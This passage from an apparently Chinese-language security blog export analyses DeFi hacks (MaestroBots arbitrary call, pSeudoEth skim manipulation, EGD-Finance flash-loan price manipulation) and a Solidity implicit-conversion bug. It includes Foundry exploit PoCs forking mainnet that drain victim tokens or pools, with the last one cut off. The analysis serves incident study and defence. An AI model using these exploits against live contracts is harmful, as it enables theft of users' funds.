href="https://etherscan.io/address/0x8eae9827b45bcc6570c4e82b9e4fe76692b2ff7a">0x8EAE9827b45bcC6570c4e82b9E4FE76692b2ff7a</a></p></li><li><p>分析其中一笔攻击交易：<a href="https://etherscan.io/tx/0xc087fbd68b9349b71838982e789e204454bfd00eebf9c8e101574376eb990d92">0xc087fbd68b9349b71838982e789e204454bfd00eebf9c8e101574376eb990d92</a></p></li><li>黑客EOA地址：<a href="https://etherscan.io/address/0xce6397e53c13ff2903ffe8735e478d31e648a2c6">0xce6397e53c13ff2903ffe8735e478d31e648a2c6</a></li><li>黑客攻击合约地址（已销毁）：<a href="https://etherscan.io/address/0xe6c6e86e04de96c4e3a29ad480c94e7a471969ab">0xe6c6e86e04de96c4e3a29ad480c94e7a471969ab</a></li><li>新的代理合约（逻辑合约，未开源）：<a href="https://etherscan.io/address/0x6599ae06914f1f5ec0053d3f475348d40e608442#code">0x6599aE06914f1f5Ec0053d3F475348D40E608442</a></li></ul><h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><p><img src="/2023/11/01/08.PoC/11.MaestroBots@arbitrary-call/image-20231026141507912.png" alt="image-20231026141507912"></p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>通过<a href="https://explorer.phalcon.xyz/tx/eth/0xc087fbd68b9349b71838982e789e204454bfd00eebf9c8e101574376eb990d92">phalcon</a>浏览器可以发现，攻击者写了一个合约，调用<code>0x9239127f</code>方法，就成功将代币转移到攻击合约中。</p><p><img src="/2023/11/01/08.PoC/11.MaestroBots@arbitrary-call/image-20231026142550675.png" alt="image-20231026142550675"></p><p>然后后面就是一系列的将获利转换成ETH的操作，我们只需要分析为什么可以直接转移代币即可，这一定是逻辑合约的函数写的有问题。</p><h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>由于逻辑合约没有开源（也许就是这个原因，就放松了警惕），我们对其进行反编译，找到<code>0x9239127f</code>方法：该函数可以对传入的<code>varg0</code>，转换后也就是一个token的地址。任何人可以对其进行任意调用，因为没有做任何传参的校验和权限校验！通览整个方法，也没有发现任何可能revert的地方。</p><p><img src="/2023/11/01/08.PoC/11.MaestroBots@arbitrary-call/image-20231026143700254.png" alt="image-20231026143700254"></p><p>修复之后的逻辑合约已经没有这个方法了</p><p><img src="/2023/11/01/08.PoC/11.MaestroBots@arbitrary-call/image-20231026144446950.png" alt="image-20231026144446950"></p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/chen4903/BlockChainPoC">GitHub</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">// https://github.com/foundry-rs/foundry/issues/4916</span><br><span class="line">// forge test --match-path test/PoC/11.MaestroBots@arbitrary-call.sol --offline -vvvv --evm-version &#x27;shanghai&#x27;</span><br><span class="line"></span><br><span class="line">contract ContractTest is Test &#123;</span><br><span class="line">    address public storageContract = 0x80a64c6D7f12C47B7c66c5B4E20E72bc1FCd5d9e;</span><br><span class="line">    IERC20 public Mog = IERC20(0xaaeE1A9723aaDB7afA2810263653A34bA2C21C7a);</span><br><span class="line">    address public logicContract = 0x8EAE9827b45bcC6570c4e82b9E4FE76692b2ff7a;</span><br><span class="line">    // 模拟其中一个受害者</span><br><span class="line">    address victim = 0x4189ad9624F838eef865B09a0BE3369EAaCd8f6F;</span><br><span class="line"></span><br><span class="line">    function setUp() public&#123;</span><br><span class="line">        vm.createSelectFork(&quot;mainnet&quot;, 18_423_219); // 攻击在18_432_662</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_exploit() public&#123;</span><br><span class="line"></span><br><span class="line">        uint256 attackBefore = Mog.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;before attack, Mog balance&quot;, attackBefore);</span><br><span class="line"></span><br><span class="line">        uint256 allowance = Mog.allowance(victim, storageContract);</span><br><span class="line">        uint256 balance = Mog.balanceOf(victim);</span><br><span class="line">        balance = allowance &lt; balance ? allowance : balance;</span><br><span class="line"></span><br><span class="line">        // 从调用关系可以知道，攻击者使用了`transferFrom`</span><br><span class="line">        bytes memory data = abi.encodeWithSignature(&quot;transferFrom(address,address,uint256)&quot;, victim, address(this), balance);</span><br><span class="line"></span><br><span class="line">        address(storageContract).call(abi.encodeWithSelector(</span><br><span class="line">            // 需要调用的方法</span><br><span class="line">            hex&quot;9239127f&quot;,</span><br><span class="line">            // token</span><br><span class="line">            uint256(uint160(address(Mog))), </span><br><span class="line">            // 对于token需要调用的数据</span><br><span class="line">            data,</span><br><span class="line">            // 不太清楚后面两个参数干嘛用的，不了解这个项目</span><br><span class="line">            uint256(0),</span><br><span class="line">            uint256(0)</span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line">        uint256 attackAfter = Mog.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;after attack, Mog balance&quot;, attackAfter);</span><br><span class="line"></span><br><span class="line">        // 检测是否获利</span><br><span class="line">        assertGt(attackAfter, attackBefore);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><ul><li>即使没有开源源代码，也不要放松警惕</li><li>对于关键函数，一定要进行权限检测和参数校验</li></ul>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>12.pSeudoEth@priceManipulation</title>
      <link href="/2023/11/01/08.PoC/12.pSeudoEth@priceManipulation/"/>
      <url>/2023/11/01/08.PoC/12.pSeudoEth@priceManipulation/</url>
      
        <content type="html"><![CDATA[<h1 id="pSeudoEth-priceManipulation"><a href="#pSeudoEth-priceManipulation" class="headerlink" title="pSeudoEth@priceManipulation"></a>pSeudoEth@priceManipulation</h1><p><code>pSeudoEth</code>是一种ERC20代币，他的<code>balanceOf()</code>并不是恒定的，随着市场变动。有黑客发现他实现的逻辑有问题，然后通过uniswap的池子进行价格操纵，拿走了池子中的<code>pSeudoEth</code>。</p><ul><li>时间：2023-10-08 10:20:59 (UTC)</li><li>损失金额：1.43 WETH (~$2.3k)</li><li>twitter<ul><li>twitter1: <a href="https://twitter.com/CertiKAlert/status/1710979615164944729">https://twitter.com/CertiKAlert/status/1710979615164944729</a></li><li>twitter2: <a href="https://twitter.com/ImmuneBytes/status/1711345757687816416">https://twitter.com/ImmuneBytes/status/1711345757687816416</a></li></ul></li></ul><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul><li>攻击事件hash：<a href="https://etherscan.io/tx/0x4ab68b21799828a57ea99c1288036889b39bf85785240576e697ebff524b3930">0x4ab68b21799828a57ea99c1288036889b39bf85785240576e697ebff524b3930</a></li><li>黑客地址：<a href="https://etherscan.io/address/0xea75aec151f968b8de3789ca201a2a3a7faeefba">0xea75AeC151f968b8De3789CA201a2a3a7FaeEFbA</a></li><li>黑客用来攻击的合约地址：<a href="https://etherscan.io/address/0xf88d1d6d9db9a39dbbfc4b101cecc495bb0636f8">0xf88D1D6D9DB9A39Dbbfc4B101CECc495bB0636F8</a></li><li>池子：<a href="https://etherscan.io/address/0x2033b54b6789a963a02bfcbd40a46816770f1161">0x2033B54B6789a963A02BfCbd40A46816770f1161</a></li><li>代币地址（未开源）：<a href="https://etherscan.io/address/0x62abdd605e710cc80a52062a8cc7c5d659dddbe7">0x62aBdd605E710Cc80a52062a8cC7c5d659dDDbE7</a></li></ul><h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><p><img src="/2023/11/01/08.PoC/12.pSeudoEth@priceManipulation/image-20231101204112812.png" alt="image-20231101204112812"></p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p><img src="/2023/11/01/08.PoC/12.pSeudoEth@priceManipulation/image-20231101204259207.png" alt="image-20231101204259207"></p><p><img src="/2023/11/01/08.PoC/12.pSeudoEth@priceManipulation/image-20231101204346524.png" alt="image-20231101204346524"></p><p><img src="/2023/11/01/08.PoC/12.pSeudoEth@priceManipulation/image-20231101204448148.png" alt="image-20231101204448148"></p><h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>从攻击过程可以看出，闪电贷只是用来获取启动资金。黑客就做了三个操作：WETH换成pETH，不断调用池子的<code>skim()</code>方法，pETH换成WETH，做完这三个操作，手头上的WETH就变多了，还款闪电贷获利。</p><p>不断的调用<code>skim()</code>就可以实现价格操纵，我们来看看<code>skim()</code>是干啥的：将池子中比<code>_reserve</code>多的币发给<code>to</code>地址，这个是用来让池子正常运作的，因为uniswap的<code>swap()</code>会比较<code>balanceOf()</code>和<code>_reserve</code>来维持k值不变，在有人“捐赠”代币到池子就会使池子暂时DoS，因此有这个方法将多余的代币转走。</p><blockquote><p>这个方法任何人都可以调用，只要池子有多余的代币，就可以拿走，当然普通人是搞不到的，因为很多机器人实时在监控着池子</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// force balances to match reserves</span><br><span class="line">function skim(address to) external lock &#123;</span><br><span class="line">    address _token0 = token0; // gas savings</span><br><span class="line">    address _token1 = token1; // gas savings</span><br><span class="line">    _safeTransfer(_token0, to, IERC20(_token0).balanceOf(address(this)).sub(reserve0));</span><br><span class="line">    _safeTransfer(_token1, to, IERC20(_token1).balanceOf(address(this)).sub(reserve1));</span><br><span class="line">&#125;</span><br><span class="line">function _safeTransfer(address token, address to, uint value) private &#123;</span><br><span class="line">    (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));</span><br><span class="line">    require(success &amp;&amp; (data.length == 0 || abi.decode(data, (bool))), &#x27;UniswapV2: TRANSFER_FAILED&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，调用了<code>skim()</code>之后会调用token的<code>transfer()</code>。但是因为pETH的合约没有开源，我们无法查看他的<code>transfer()</code>的具体实现。</p><p>但是，其攻击逻辑和这篇<a href="https://medium.com/@Ancilia/the-uniswap-skim-token-balance-attack-b1399943d560">文章</a>的如出一辙。我们可以推断，这个pETH的<code>transfer()</code>调用会影响类如<code>_totalSupply</code>这种变量，<code>balanceOf()</code>受到这个变量的影响，价格会波动！并且其<code>transfer()</code>没有检验发送者和接收者的地址，则可以不断调用<code>transfer()</code>使得<code>_totalSupply</code>无限制的增大，进而使得我们拥有的pETH增多。</p><p>但是，池子中的<code>_reserve</code>不变，则币对价格不变，我们手头上的pETH经过<code>balanceOf()</code>获得的余额增多，则我们可以用pETH在池子中换取更多的代币。类似的原理可以查看这个<a href="https://maxwelldulin.com/Resources/1110">文章</a>。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/chen4903/BlockChainPoC">GitHub</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ContractTest is Test &#123;</span><br><span class="line">    IWETH WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));</span><br><span class="line">    IERC20 pEth = IERC20(0x62aBdd605E710Cc80a52062a8cC7c5d659dDDbE7);</span><br><span class="line">    IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);</span><br><span class="line">    IUniswapV2Router UniRouter = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));</span><br><span class="line">    IUniswapV2Pair UNIPair = IUniswapV2Pair(0x2033B54B6789a963A02BfCbd40A46816770f1161);</span><br><span class="line">    uint amount = 51_970_861_731_879_316_502_999;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;mainnet&quot;, 18_305_132 - 1);</span><br><span class="line">        vm.label(address(WETH), &quot;WETH&quot;);</span><br><span class="line">        vm.label(address(Balancer), &quot;Balancer&quot;);</span><br><span class="line">        vm.label(address(UniRouter), &quot;Uniswap V2: Router&quot;);</span><br><span class="line">        vm.label(address(UNIPair), &quot;Uniswap V2: pEth&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() external &#123;</span><br><span class="line">        WETH.approve(address(UniRouter), type(uint256).max);</span><br><span class="line">        pEth.approve(address(UniRouter), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        uint startWETH = WETH.balanceOf(address(this));</span><br><span class="line">        console.log(&quot;Before Start: %d WETH&quot;, startWETH);</span><br><span class="line">        address[] memory tokens = new address[](1);</span><br><span class="line">        tokens[0] = address(WETH);</span><br><span class="line">        uint[] memory amounts = new uint[](1);</span><br><span class="line">        amounts[0] = amount;</span><br><span class="line">        Balancer.flashLoan(address(this), tokens, amounts, &quot;&quot;);</span><br><span class="line"></span><br><span class="line">        uint intRes =  WETH.balanceOf(address(this))/1 ether;</span><br><span class="line">        uint decRes =  WETH.balanceOf(address(this)) - intRes * 1e18;</span><br><span class="line">        console.log(&quot;Attack Exploit: %s.%s WETH&quot;, intRes, decRes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function receiveFlashLoan(</span><br><span class="line">        address[] memory tokens,</span><br><span class="line">        uint256[] memory amounts,</span><br><span class="line">        uint256[] memory feeAmounts,</span><br><span class="line">        bytes memory userData</span><br><span class="line">    ) external &#123;</span><br><span class="line">        address[] memory path = new address [](2);</span><br><span class="line">        (path[0], path[1]) = (address(WETH), address(pEth));</span><br><span class="line">        UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">            amounts[0], 0, path, address(this), type(uint).max);</span><br><span class="line">        uint pEth_amount = pEth.balanceOf(address(this));</span><br><span class="line">        pEth.transfer(address(UNIPair), pEth_amount);</span><br><span class="line"></span><br><span class="line">        for(uint i=0; i&lt;10; i++)&#123;</span><br><span class="line">            UNIPair.skim(address(UNIPair));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        (path[0], path[1]) = (address(pEth), address(WETH));</span><br><span class="line">        pEth_amount = pEth.balanceOf(address(this));</span><br><span class="line">        UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">            pEth_amount, 0, path, address(this), type(uint).max);</span><br><span class="line"></span><br><span class="line">        WETH.transfer(address(Balancer), amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="建议"><a href="#建议" class="headerlink" title="建议"></a>建议</h2><ul><li>如果代币的balanceOf()是魔改的，余额会随着市场而变动，那么需要非常注意实现！其中一种漏洞就是transfer()发送者和接收者没有校验不能相同</li><li>魔改的代币需要时刻注意</li></ul>]]></content>
      
      
      <categories>
          
          <category> 08.PoC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>45.隐式转换</title>
      <link href="/2023/10/25/00.security/45.%E9%9A%90%E5%BC%8F%E8%BD%AC%E6%8D%A2/"/>
      <url>/2023/10/25/00.security/45.%E9%9A%90%E5%BC%8F%E8%BD%AC%E6%8D%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="隐式转换"><a href="#隐式转换" class="headerlink" title="隐式转换"></a>隐式转换</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity 0.8.0;</span><br><span class="line"></span><br><span class="line">// https://github.com/ethereum/solidity/issues/13004</span><br><span class="line">// https://twitter.com/paladin_marco/status/1584538632810942464</span><br><span class="line"></span><br><span class="line">contract test&#123;</span><br><span class="line"></span><br><span class="line">    function toHours(uint8 _days) public pure returns(uint256)&#123;</span><br><span class="line">        // implicitly converted to uint8</span><br><span class="line">        return 24 * _days;</span><br><span class="line">        // 修复</span><br><span class="line">        // return uint256(_days) * 24;</span><br><span class="line">    &#125; // 10+ will revert</span><br><span class="line"></span><br><span class="line">    function toSeconds(uint8 _days) public pure returns(uint256)&#123;</span><br><span class="line">        // implicitly converted to uint24</span><br><span class="line">        // 在 Solidity 中，时间单位会在特定的时间长度内转换为几秒的单位。例如，这里的 days 被转换为 uint24 格式。</span><br><span class="line">        return _days * 1 days;</span><br><span class="line">        // 修复</span><br><span class="line">        // return uint256(_days) * uint256(1 days);</span><br><span class="line">    &#125; // 194+ will revert</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 00.security </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>10.EGD-Finance@flashloan@priceManipulation</title>
      <link href="/2023/10/25/08.PoC/10.EGD-Finance@flashloan@priceManipulation/"/>
      <url>/2023/10/25/08.PoC/10.EGD-Finance@flashloan@priceManipulation/</url>
      
        <content type="html"><![CDATA[<h1 id="EGD-Finance-flashloan-priceManipulation"><a href="#EGD-Finance-flashloan-priceManipulation" class="headerlink" title="EGD-Finance@flashloan@priceManipulation"></a>EGD-Finance@flashloan@priceManipulation</h1><h2 id="事件背景"><a href="#事件背景" class="headerlink" title="事件背景"></a>事件背景</h2><p>又有一个项目被黑客用闪电贷进行价格操纵</p><p><img src="/2023/10/25/08.PoC/10.EGD-Finance@flashloan@priceManipulation/image-20230909123043529.png" alt="image-20230909123043529"></p><ul><li>时间：2022.08.07</li><li>损失金额：36,044 USDT（$36,044）</li></ul><h2 id="交易"><a href="#交易" class="headerlink" title="交易"></a>交易</h2><ul><li>漏洞合约地址：<a href="https://bscscan.com/address/0x34bd6dba456bc31c2b3393e499fa10bed32a9370">0x34bd6dba456bc31c2b3393e499fa10bed32a9370</a></li><li>质押，攻击前准备hash：<a href="https://bscscan.com/tx/0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8">0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8</a></li><li>闪电贷攻击hash：<a href="https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3">0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3</a></li><li>池子合约地址：<a href="https://bscscan.com/address/0xa361433e409adac1f87cdf133127585f8a93c67d">0xa361433E409Adac1f87CDF133127585F8a93c67d</a></li><li>攻击合约地址：<a href="https://bscscan.com/address/0xc30808d9373093fbfcec9e026457c6a9dab706a7">0xc30808d9373093fbfcec9e026457c6a9dab706a7</a></li><li>黑客EOA地址：<a href="https://bscscan.com/address/0xee0221d76504aec40f63ad7e36855eebf5ea5edd">0xee0221D76504Aec40f63ad7e36855EEbF5eA5EDd</a></li></ul><h2 id="资金流向"><a href="#资金流向" class="headerlink" title="资金流向"></a>资金流向</h2><p><img src="/2023/10/25/08.PoC/10.EGD-Finance@flashloan@priceManipulation/image-20230909123406260.png" alt="image-20230909123406260"></p><h2 id="攻击过程"><a href="#攻击过程" class="headerlink" title="攻击过程"></a>攻击过程</h2><p>攻击前准备：2022-08-07 23:14:52 (UTC) </p><p><img src="/2023/10/25/08.PoC/10.EGD-Finance@flashloan@priceManipulation/image-20230909132206729.png" alt="image-20230909132206729"></p><p>发起攻击：2022-08-07 23:15:46 (UTC)</p><p><img src="/2023/10/25/08.PoC/10.EGD-Finance@flashloan@priceManipulation/image-20230909133848822.png" alt="image-20230909133848822"></p><h2 id="攻击详细分析"><a href="#攻击详细分析" class="headerlink" title="攻击详细分析"></a>攻击详细分析</h2><p>从攻击过程可以知道：先是stake一笔钱，然后通过两次闪电贷借出池子中的<code>BSC-USD</code>，然后调用<code>claimAllReward()</code>获取质押的奖励。那么核心问题就是通过闪电贷完成了价格操纵，因此我们来查看一下获得价格的代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function getEGDPrice() public view returns (uint)&#123;</span><br><span class="line">    uint balance1 = EGD.balanceOf(pair);</span><br><span class="line">    uint balance2 = U.balanceOf(pair);</span><br><span class="line">    return (balance2 * 1e18 / balance1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以发现，EGD的价格只是简单的通过除法计算：<code>池子中的BSC-USD数量 / 池子中的EGD的数量</code>。如果通过闪电贷在池子中借走大量的BSC-USD，就会使得EGD的价格急剧下降，反之急剧上升，从而操纵价格。</p><p>既然存在价格操纵的漏洞，那么就可以找一下哪里可以利用此漏洞从而获利。黑客找到了这个质押然后获取利润的<code>claimAllReward()</code>函数，从这个方法可以看出，利润是给EGD代币，并且利润的计算是用<code>利润因子/EGD价格</code>，并且限制比较少（比如质押一定的时间，不能太短时间内就取款，等等）。</p><p><img src="/2023/10/25/08.PoC/10.EGD-Finance@flashloan@priceManipulation/image-20230909135040726.png" alt="image-20230909135040726"></p><p>因此，可以操纵价格，使得EGD价格急剧下降，从而使得利润<code>rew</code>变大从而获利，是典型的闪电贷操纵价格的攻击方式。</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p><a href="https://github.com/chen4903/BlockChainPoC/tree/master">GitHub</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.10;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;./interface.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract ContractTest is Test &#123;</span><br><span class="line"></span><br><span class="line">    // 两次闪电贷分别借款金额</span><br><span class="line">    uint256 constant FLASHLOANAMOUNT_01 = 2000 * 1e18;</span><br><span class="line">    uint256 FLASHLOANAMOUNT_02;</span><br><span class="line"></span><br><span class="line">    IERC20 public EGD = IERC20(0x202b233735bF743FA31abb8f71e641970161bF98);</span><br><span class="line">    IERC20 public BSC_USD = IERC20(0x55d398326f99059fF775485246999027B3197955);</span><br><span class="line"></span><br><span class="line">    IPancakeRouter public router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));</span><br><span class="line">    IPancakePair public pair_wbnbUSD = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);</span><br><span class="line">    IPancakePair public pair_egdUSD = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);</span><br><span class="line"></span><br><span class="line">    IEGDFinance public EGDFinance = IEGDFinance(0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370);</span><br><span class="line">    bool public countFlashloan = false; // 用于控制两次不同的闪电贷回调函数</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        vm.createSelectFork(&quot;bsc&quot;, 20_245_521); // 黑客第一笔交易是进行stake，在20_245_522</span><br><span class="line"></span><br><span class="line">        vm.label(address(EGD), &quot;EGD&quot;);</span><br><span class="line">        vm.label(address(BSC_USD), &quot;BSC_USD&quot;);</span><br><span class="line">        vm.label(address(router), &quot;router&quot;);</span><br><span class="line">        vm.label(address(pair_wbnbUSD), &quot;pair_wbnbUSD&quot;);</span><br><span class="line">        vm.label(address(pair_egdUSD), &quot;pair_egdUSD&quot;);</span><br><span class="line">        vm.label(address(EGDFinance), &quot;EGDFinance&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line"></span><br><span class="line">        // 做好准备工作: 授权</span><br><span class="line">        EGD.approve(address(router), ~uint256(0));</span><br><span class="line">        BSC_USD.approve(address(router), 